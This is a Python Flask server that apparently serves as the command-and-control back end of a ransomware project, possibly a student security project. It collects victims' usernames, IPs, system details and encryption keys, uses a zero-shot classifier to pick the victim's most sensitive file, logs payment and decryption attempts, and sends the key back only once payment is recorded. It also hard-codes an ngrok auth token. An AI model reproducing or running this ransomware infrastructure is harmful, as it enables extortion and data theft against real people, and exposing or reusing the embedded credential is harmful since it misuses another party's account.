import sqlite3
import requests
import threading
import time
from datetime import datetime
from flask import Flask, request
from pyngrok import ngrok, conf
from transformers import pipeline

app = Flask(__name__)

NGROK_KEY = "2w5zqSXHPu3FvDq8PjnItTVHSWj_7HB4Mg7of9P3TFP7TSGn8"
sequence_to_classify = "A file name with the potential to contain sensitive content"
classifier = pipeline("zero-shot-classification", model="facebook/bart-large-mnli")

@app.route("/key", methods=["POST"])
def receive_key():

    data = request.json

    #----------------------------------------------------------------------------------------------------#

    # Creating or connecting to database tables.

    conn = sqlite3.connect("table.db")
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
    ID INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    email_address TEXT,
    system TEXT,
    release TEXT,
    IP TEXT,
    file_path TEXT,         
    key TEXT,
    URL TEXT,
    timestamp TEXT,
    status TEXT)
    """)
    conn.commit()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS statistics (
    ID INTEGER PRIMARY KEY AUTOINCREMENT,
    decryption_attempts TEXT,
    payment_attempts TEXT,
    decryption_elapsed_time TEXT,
    payment_elapsed_time TEXT,
    help_elapsed_time TEXT,
    is_personal_information_provided TEXT,         
    window_closure_method TEXT)
    """)
    conn.commit()

    #----------------------------------------------------------------------------------------------------#

    # Inserting the client's details into the table and using an AI model to identify the most sensitive file.

    if data.get("username"):

        username = data["username"]
        system = data["system"]
        release = data["release"]
        ip = data["IP"]
        key = data["key"]
        url = ngrok.connect(addr=data["URL"]).public_url
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        status = "Encrypted"
        window_closure_method = None # The window has not closed yet

        file_list = data["file_list"]

        result = classifier(sequence_to_classify, file_list)
        best_score_index = result['scores'].index(max(result['scores']))
        best_label = result['labels'][best_score_index]

        file_path = best_label

        cursor.execute("""
        INSERT INTO users (username, system, release, IP, file_path, key, URL, timestamp, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (username, system, release, ip, file_path, key, url, timestamp, status))
        conn.commit()

        cursor.execute("""
        INSERT INTO statistics (window_closure_method)
        VALUES (?)
        """, (window_closure_method,))
        conn.commit()
        
        requests.post(f"{url}/key", json={"session_id": cursor.lastrowid, "file_path": file_path})

        return "OK"
    
    #----------------------------------------------------------------------------------------------------#

    # Inserting the client's email address into the table

    elif data.get("email_address"):

        session_id = data["session_id"]
        email_address = data["email_address"]

        cursor.execute("""
        UPDATE users
        SET email_address = ?
        WHERE ID = ?
        """, (email_address, session_id))
        conn.commit()

        return "OK"

    #----------------------------------------------------------------------------------------------------#

    # Inserting statistics into the table, decrypting the file if payment was made by the user, 
    # and updating the status accordingly.
          
    elif data.get("session_id"):
                   
        session_id = data["session_id"]
        decryption_attempts = data["decryption_attempts"]
        payment_attempts = data["payment_attempts"]
        decryption_elapsed_time = data["decryption_elapsed_time"]
        payment_elapsed_time = data["payment_elapsed_time"]
        help_elapsed_time = data["help_elapsed_time"]
        is_personal_information_provided = data["is_personal_information_provided"]
        window_closure_method = data["window_closure_method"]

        cursor.execute("""
        SELECT key, URL FROM users
        WHERE ID = ?
        """, (session_id,))

        key, url = cursor.fetchone()

        if (window_closure_method == "Payment"):
            requests.post(f"{url}/key", json={"key": key})
                
        ngrok.disconnect(f"{url}/key")

        if window_closure_method == "Payment" or window_closure_method == "Decryption":

            status = "Decrypted"   
            cursor.execute("""
            UPDATE users
            SET status = ?
            WHERE ID = ?
            """, (status, session_id))
            conn.commit()

        cursor.execute("""
        UPDATE statistics
        SET decryption_attempts = ?, payment_attempts = ?, decryption_elapsed_time = ?, payment_elapsed_time = ?, help_elapsed_time = ?, is_personal_information_provided = ?, window_closure_method = ?
        WHERE ID = ?
        """, (decryption_attempts, payment_attempts, decryption_elapsed_time, payment_elapsed_time, help_elapsed_time, is_personal_information_provided, window_closure_method, session_id))
        conn.commit()

        return "OK"
    
    #----------------------------------------------------------------------------------------------------#
            
    return "Invalid request", 400

def run_flask():
    app.run(host="127.0.0.1", port=5000)

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

conf.get_default().auth_token = NGROK_KEY 
public_url = ngrok.connect(addr="127.0.0.1:5000", subdomain="Network-Security-Project", bind_tls=True)

time.sleep(60*60) # 1 hour